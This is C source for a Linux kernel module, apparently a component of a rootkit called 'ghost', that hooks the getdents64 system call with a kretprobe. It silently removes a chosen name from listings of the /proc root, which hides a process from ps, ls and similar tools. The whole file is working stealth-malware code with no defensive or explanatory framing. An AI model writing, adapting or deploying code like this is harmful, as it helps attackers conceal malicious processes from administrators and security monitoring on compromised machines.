// SPDX-License-Identifier: GPL-2.0
#include <linux/errno.h>
#include <linux/file.h>
#include <linux/kprobes.h>
#include <linux/magic.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>

#include "ghost.h"

#define DIRENT_HEADER_SIZE offsetof(struct linux_dirent64, d_name)

struct getdents_context {
	struct linux_dirent64 __user *entries;
	bool proc_root;
};

static const char *hidden_name;

static int save_context(struct kretprobe_instance *instance,
			struct pt_regs *registers)
{
	struct getdents_context *context = (void *)instance->data;
	struct pt_regs *syscall_registers = (void *)registers->di;
	struct fd directory = fdget((int)syscall_registers->di);
	struct file *file = fd_file(directory);

	context->entries = (void __user *)syscall_registers->si;
	context->proc_root = false;
	if (file) {
		struct dentry *dentry = file->f_path.dentry;

		context->proc_root =
			dentry->d_sb->s_magic == PROC_SUPER_MAGIC &&
			dentry == dentry->d_sb->s_root;
		fdput(directory);
	}
	return 0;
}

static int filter_entries(struct kretprobe_instance *instance,
			  struct pt_regs *registers)
{
	struct getdents_context *context = (void *)instance->data;
	long length = regs_return_value(registers);
	struct linux_dirent64 *entry;
	char *buffer;
	long offset = 0;

	if (!context->proc_root || length <= 0)
		return 0;

	buffer = kmalloc(length, GFP_ATOMIC);
	if (!buffer)
		return 0;
	if (copy_from_user_nofault(buffer, context->entries, length))
		goto free_buffer;

	while (offset < length) {
		size_t name_capacity;
		unsigned short record_length;

		if (length - offset < DIRENT_HEADER_SIZE + 1)
			goto free_buffer;
		entry = (void *)(buffer + offset);
		record_length = entry->d_reclen;
		if (record_length < DIRENT_HEADER_SIZE + 1 ||
		    record_length > length - offset)
			goto free_buffer;

		name_capacity = record_length - DIRENT_HEADER_SIZE;
		if (strnlen(entry->d_name, name_capacity) == name_capacity)
			goto free_buffer;

		if (!strcmp(entry->d_name, hidden_name)) {
			long tail = length - offset - record_length;

			memmove(buffer + offset, buffer + offset + record_length,
				tail);
			length -= record_length;
			continue;
		}
		offset += record_length;
	}

	if (copy_to_user_nofault(context->entries, buffer, length))
		regs_set_return_value(registers, -EFAULT);
	else
		regs_set_return_value(registers, length);

free_buffer:
	kfree(buffer);
	return 0;
}

static struct kretprobe getdents_probe = {
	.kp.symbol_name = "__x64_sys_getdents64",
	.entry_handler = save_context,
	.handler = filter_entries,
	.data_size = sizeof(struct getdents_context),
};

int dirhide_start(const char *name)
{
	hidden_name = name;
	return register_kretprobe(&getdents_probe);
}

void dirhide_stop(void)
{
	unregister_kretprobe(&getdents_probe);
}
